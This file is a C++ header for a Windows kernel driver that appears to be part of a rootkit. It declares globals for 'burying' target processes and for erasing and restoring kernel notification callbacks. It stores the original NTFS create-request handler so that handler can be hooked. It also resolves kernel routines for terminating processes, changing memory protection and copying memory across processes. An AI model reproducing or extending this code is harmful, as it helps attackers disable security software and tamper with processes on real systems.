#pragma once

#include <ntifs.h>
#include <wdf.h>
#include "WinTypes.hpp"
#include "Vector.hpp"

namespace BeGlobals
{
    PVOID NtOsKrnlAddr;
    PDRIVER_OBJECT driverObject;
}

#include "AddressUtils.hpp"
#include "AutoLock.hpp"

#define MAX_BURIED_PROCESSES 256
#define MAX_ERASE_CALLBACKS 256

typedef struct _WCHAR_ARRAY {
    WCHAR* array[MAX_BURIED_PROCESSES];
    INT length;
} WCHAR_ARRAY;

typedef struct _KERNEL_CALLBACK_RESTORE_INFO_ARRAY {
    LONG64 addrOfCallbackFunction[MAX_ERASE_CALLBACKS];
    LONG64 callbackToRestore[MAX_ERASE_CALLBACKS];
    CALLBACK_TYPE callbackType[MAX_ERASE_CALLBACKS];
    INT length;
} KERNEL_CALLBACK_RESTORE_INFO_ARRAY_ARRAY;

typedef NTSTATUS(NTAPI* NTFS_IRP_MJ_CREATE_FUNCTION)(PDEVICE_OBJECT DeviceObject, PIRP Irp);

// Function Prototypes
typedef NTSTATUS(*ZWTERMINATEPROCESS)(IN HANDLE ProcessHandle OPTIONAL, IN NTSTATUS ExitStatus);
typedef NTSTATUS(*ZWOPENPROCESS)(OUT PHANDLE ProcessHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes, IN PCLIENT_ID ClientId);
typedef NTSTATUS(*ZWCLOSE)(IN HANDLE Handle);
typedef NTSTATUS(*ZWPROTECTVIRTUALMEMORY)(IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN OUT PSIZE_T RegionSize, IN ULONG NewProtect, OUT PULONG OldProtect);
typedef NTSTATUS(*MMCOPYVIRTUALMEMORY)(IN PEPROCESS SourceProcess, IN PVOID SourceAddress, IN PEPROCESS TargetProcess, OUT PVOID TargetAddress, IN SIZE_T BufferSize, IN KPROCESSOR_MODE PreviousMode, OUT PSIZE_T ReturnSize);
typedef NTSTATUS(*OBREFERENCEOBJECTBYNAME)(PUNICODE_STRING ObjectName, ULONG Attributes, PACCESS_STATE AccessState, ACCESS_MASK DesiredAccess, POBJECT_TYPE ObjectType, KPROCESSOR_MODE AccessMode, PVOID ParseContext, PVOID* Object);

namespace BeGlobals
{
    WCHAR_ARRAY beBuryTargetProcesses = { { NULL }, 0 };
    KERNEL_CALLBACK_RESTORE_INFO_ARRAY_ARRAY beCallbacksToRestore = { { NULL }, { NULL }, { CallbackTypeNone }, 0 };

    // Mutexes
    FastMutex buryLock = FastMutex();
    FastMutex processListLock = FastMutex();
    FastMutex callbackLock = FastMutex();

    NTFS_IRP_MJ_CREATE_FUNCTION originalNTFS_IRP_MJ_CREATE_function = NULL;

    ZWTERMINATEPROCESS pZwTerminateProcess;
    ZWOPENPROCESS pZwOpenProcess;
    ZWCLOSE pZwClose;
    ZWPROTECTVIRTUALMEMORY pZwProtectVirtualMemory;
    MMCOPYVIRTUALMEMORY pMmCopyVirtualMemory;
    OBREFERENCEOBJECTBYNAME pObReferenceObjectByName;

    NTSTATUS
    BeInitGlobals(PDRIVER_OBJECT DriverObject)
    {
        driverObject = DriverObject;

        // Get base address of ntoskrnl module
        NtOsKrnlAddr = BeGetKernelBaseAddr();
        LOG_MSG("ntoskrnl.exe base addr:0x%llx\n", (UINT64)NtOsKrnlAddr);

        // init locks
        buryLock.Init();
        processListLock.Init();
        callbackLock.Init();

        // Function resolving
        pZwTerminateProcess = (ZWTERMINATEPROCESS)BeGetSystemRoutineAddress("ZwTerminateProcess");
        pZwOpenProcess = (ZWOPENPROCESS)BeGetSystemRoutineAddress("ZwOpenProcess");
        pZwClose = (ZWCLOSE)BeGetSystemRoutineAddress("ZwClose");
        pZwProtectVirtualMemory = (ZWPROTECTVIRTUALMEMORY)BeGetSystemRoutineAddress("ZwProtectVirtualMemory");
        pMmCopyVirtualMemory = (MMCOPYVIRTUALMEMORY)BeGetSystemRoutineAddress("MmCopyVirtualMemory");
        pObReferenceObjectByName = (OBREFERENCEOBJECTBYNAME)BeGetSystemRoutineAddress("ObReferenceObjectByName");
        if (!pZwTerminateProcess || !pZwOpenProcess || !pZwClose || !pZwProtectVirtualMemory || !pMmCopyVirtualMemory || !pObReferenceObjectByName)
        {
            LOG_MSG("Failed to resolve one or more functions\n");
            return STATUS_NOT_FOUND;
        }

        return STATUS_SUCCESS;
    }
}

